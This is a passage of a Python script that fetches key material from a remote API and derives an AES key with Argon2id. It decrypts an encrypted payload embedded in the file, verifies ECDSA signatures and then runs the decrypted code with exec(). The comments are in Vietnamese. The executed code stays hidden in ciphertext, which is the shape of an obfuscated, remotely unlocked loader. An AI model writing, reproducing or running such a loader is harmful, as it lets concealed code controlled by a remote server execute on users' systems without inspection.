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",
  "public_pem": "-----BEGIN PUBLIC KEY-----\nMIGbMBAGByqGSM49AgEGBSuBBAAjA4GGAAQBc1MOPPKIFl2tRITFTKIlr1WsTZCqoKfTsFIrk7lq\njSsSUl022AVWJOtFcEkRw4xY/vgH6KS+JZQMApHjdYkYEYYB41DNYYuisyD1xE9+UvF3pJraYjWE\n9J8G9g+BMgQKS/XgzKYPDWqit5aqSMyhf8lWn/RYgN4uhcZ3pFyT3T45nR8=\n-----END PUBLIC KEY-----\n"
}
def from_bitstring(s: str) -> bytes:
    pad = (8 - (len(s) % 8)) % 8
    if pad:
        s = s + ("0"*pad)
    return bytes(int(s[i:i+8], 2) for i in range(0, len(s), 8))

def find_meta_from_api(enc_id, api_url):
    try:
        r = requests.get(api_url, timeout=10)
        r.raise_for_status()
        arr = r.json()
        if not isinstance(arr, list):
            return None
        for obj in arr:
            if isinstance(obj, dict) and obj.get("enc_id") == enc_id:
                bits = obj.get("meta_bits")
                if isinstance(bits, str):
                    return bits
    except Exception as e:
        print("Lỗi khi lấy metadata từ API:", e)
    return None

def main():
    enc_id = META["enc_id"]
    api_url = META["api_url"]
    bits = find_meta_from_api(enc_id, api_url)
    if not bits:
        print("Không tìm thấy enc_id trên API hoặc error.")
        return
    raw = from_bitstring(bits)
    # header 3 * uint32
    if len(raw) < 12:
        print("Meta không hợp lệ")
        return
    a,b,c = struct.unpack(">III", raw[:12])
    off = 12
    base_key = raw[off:off+a]; off += a
    sig_plain = raw[off:off+b]; off += b
    sig_cipher = raw[off:off+c]; off += c

    # phái sinh key qua Argon2id (phải trùng với cách tạo file encryptor)
    salt = base64.b64decode(META["salt_b64"])
    enc_key = hash_secret_raw(base_key, salt, time_cost=2, memory_cost=65536, parallelism=1, hash_len=32, type=Type.ID)

    # giải mã AES-GCM
    nonce = base64.b64decode(META["nonce_b64"])
    tag = base64.b64decode(META["tag_b64"])
    cipher_b = base64.b64decode(META["cipher_b64"])
    try:
        cipher = AES.new(enc_key, AES.MODE_GCM, nonce=nonce)
        plaintext = cipher.decrypt_and_verify(cipher_b, tag)
    except Exception as e:
        print("Giải mã thất bại:", e)
        return

    # verify signatures
    vk = VerifyingKey.from_pem(META["public_pem"])
    try:
        vk.verify(sig_plain, plaintext)
    except Exception as e:
        print("Chữ ký plaintext không hợp lệ:", e)
        return
    try:
        vk.verify(sig_cipher, nonce + cipher_b + tag)
    except Exception as e:
        print("Chữ ký ciphertext không hợp lệ:", e)
        return

    # exec
    try:
        exec(plaintext.decode('utf-8'), globals())
    except Exception as e:
        print("Lỗi khi chạy code giải mã:", e)

if __name__ == "__main__":
    main()
